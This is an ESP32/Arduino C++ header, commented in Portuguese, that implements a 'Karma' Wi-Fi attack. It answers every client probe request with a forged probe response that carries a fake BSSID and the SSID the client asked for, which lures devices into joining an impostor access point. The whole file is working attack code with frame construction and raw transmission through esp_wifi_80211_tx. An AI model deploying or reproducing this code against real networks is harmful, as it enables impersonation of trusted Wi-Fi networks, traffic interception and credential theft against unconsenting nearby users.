#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"

// Karma Attack: responde a probe requests com AP falso idêntico ao SSID pedido
class KarmaAttack {
public:
    static KarmaAttack& get() { static KarmaAttack inst; return inst; }

    bool running = false;
    std::vector<String> respondedTo;

    void start() {
        running = true;
        respondedTo.clear();
        LOG.warn("[KARMA] Ativo — respondendo a probe requests...");
    }

    void stop() {
        running = false;
        LOG.info("[KARMA] Parado. Respondido para " + String(respondedTo.size()) + " SSIDs");
    }

    void onProbe(const uint8_t* clientMac, const char* ssid, uint8_t ch) {
        if (!running || !ssid || strlen(ssid) == 0) return;
        _sendProbeResponse(clientMac, ssid, ch);
        String s = String(ssid);
        bool found = false;
        for (auto& r : respondedTo) if (r == s) { found = true; break; }
        if (!found) {
            respondedTo.push_back(s);
            LOG.success("[KARMA] → \"" + s + "\" ch" + String(ch));
        }
    }

private:
    void _sendProbeResponse(const uint8_t* da, const char* ssid, uint8_t ch) {
        uint8_t ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        uint8_t frame[128] = {};
        uint8_t fakeBSSID[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, (uint8_t)(ch & 0xFF)};

        frame[0] = 0x50; frame[1] = 0x00; // Probe Response
        frame[2] = 0x00; frame[3] = 0x00;
        memcpy(frame + 4,  da,        6);
        memcpy(frame + 10, fakeBSSID, 6);
        memcpy(frame + 16, fakeBSSID, 6);
        frame[22] = 0x00; frame[23] = 0x00;

        uint8_t off = 24;
        uint64_t ts = esp_timer_get_time();
        memcpy(frame + off, &ts, 8); off += 8;
        frame[off++] = 0x64; frame[off++] = 0x00; // beacon interval
        frame[off++] = 0x11; frame[off++] = 0x04; // capabilities ESS+Privacy
        frame[off++] = 0x00; frame[off++] = ssidLen;
        memcpy(frame + off, ssid, ssidLen); off += ssidLen;
        frame[off++] = 0x01; frame[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(frame + off, rates, 8); off += 8;
        frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = ch;

        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }
};
